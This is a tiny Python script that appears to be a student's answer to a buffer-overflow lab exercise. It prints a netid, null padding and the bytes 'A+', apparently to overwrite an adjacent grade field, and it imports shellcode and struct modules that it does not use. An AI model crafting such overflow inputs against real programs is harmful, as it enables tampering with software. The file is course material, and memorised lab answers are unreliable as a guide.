#!/usr/bin/env python3

import sys
from shellcode import shellcode
from struct import pack

# Your code here
netid = 'ambala2'
sys.stdout.buffer.write(netid.encode('utf8')  + b'\0'*(10 - len(netid))+ b'A+')
